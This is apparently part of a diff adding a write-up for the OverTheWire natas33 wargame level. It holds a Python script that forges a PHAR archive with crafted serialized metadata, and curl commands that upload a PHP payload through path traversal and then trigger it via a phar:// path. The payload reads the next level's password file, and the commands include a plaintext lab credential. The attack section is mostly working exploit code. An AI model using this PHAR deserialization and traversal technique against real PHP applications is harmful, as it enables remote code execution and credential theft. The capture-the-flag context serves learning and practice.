+  python3 - <<'PY'
+  import struct, zlib, hashlib
+  payload = open('/tmp/n33payload.php','rb').read()
+  md5 = hashlib.md5(payload).hexdigest()
+  STUB = b"<?php __HALT_COMPILER(); ?>\r\n"
+  k = b"\x00Executor\x00"
+  meta  = b'O:8:"Executor":3:{'
+  meta += b's:%d:"%sfilename";s:%d:"/tmp/n33payload.php";' % (len(k+b"filename"), k, len("/tmp/n33payload.php"))
+  meta += b's:%d:"%ssignature";s:32:"%s";' % (len(k+b"signature"), k, md5.encode())
+  meta += b's:%d:"%sinit";b:0;}' % (len(k+b"init"), k)
+  m  = struct.pack("<I", 1)
+  m += struct.pack("<H", 0x11)
+  m += struct.pack("<I", 0x10000)
+  m += struct.pack("<I", 0)
+  m += struct.pack("<I", len(meta)) + meta
+  m += struct.pack("<I", 1) + b"x"
+  m += struct.pack("<I", 1) + struct.pack("<I", 0) + struct.pack("<I", 1)
+  m += struct.pack("<I", zlib.crc32(b"x") & 0xFFFFFFFF)
+  m += struct.pack("<I", 0x1A4) + struct.pack("<I", 0)
+  out = STUB + struct.pack("<I", len(m)) + m + b"x"
+  out += hashlib.sha1(out).digest() + struct.pack("<I", 2) + b"GBMB"
+  open('/tmp/n33r.phar','wb').write(out)
+  print("payload md5=%s -> /tmp/n33r.phar (%d bytes)" % (md5, len(out)))
+  PY
+  curl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL -F "filename=../../../tmp/n33payload.php" -F "uploadedfile=@/tmp/n33payload.php" http://natas33.natas.labs.overthewire.org/index.php | sed "s/<[^>]*>//g" | grep -a "uploaded"
+  curl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL -F "filename=../../../tmp/n33r.phar" -F "uploadedfile=@/tmp/n33r.phar" http://natas33.natas.labs.overthewire.org/index.php | sed "s/<[^>]*>//g" | grep -a "uploaded"
+  printf 'x' > /tmp/h.txt
+  curl -s -u natas33:kmIpGpPfpBF529wy1C8FGb9ZSO7fTlKL -F "filename=phar:///tmp/n33r.phar" -F "uploadedfile=@/tmp/h.txt" http://natas33.natas.labs.overthewire.org/index.php | sed "s/<[^>]*>//g" | grep -aE "Congratulations|Running|natas34|Failur" | tail -2
+  ```
 ### Step-by-step discovery and crafting (what the recording shows)
 1. **Read the source.** `private $filename`, `private $signature='adeafbadbabec0dedabada55ba55d00d'`, `__destruct()` → `md5_file($this->filename) == $this->signature` → `passthru("php " . $this->filename)`.
 2. **Write the payload.** `<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>` → md5 `8a54d751b7e2bbbb2643d355d49e81be`.
